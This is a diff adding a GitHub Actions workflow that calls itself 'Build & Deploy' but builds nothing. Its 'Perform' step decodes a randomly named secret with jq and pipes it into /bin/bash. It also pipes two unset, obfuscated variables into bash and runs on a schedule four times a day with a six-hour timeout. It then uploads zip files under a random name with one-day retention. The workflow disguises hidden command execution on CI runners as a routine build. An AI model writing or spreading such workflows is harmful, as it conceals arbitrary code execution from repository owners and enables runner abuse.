@@ -1,0 +1,32 @@
+name: Build & Deploy
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '14 3,9,15,21 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  workflow:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Perform
+        env:
+          qku15298: ${{ secrets.qku15298 }}
+        run: |
+          printf '%s' "$qku15298" | jq -r .abt0953 | /bin/bash
+          echo $nto8475 | jq -r .kksnh832 | /bin/bash
+          echo $cjhmk2 | jq -r .rkyli48 | /bin/bash
+
+      - name: Archive results
+        uses: actions/upload-artifact@v4
+        with:
+          name: oBSUeACd
+          path: "*.zip"
+          retention-days: 1
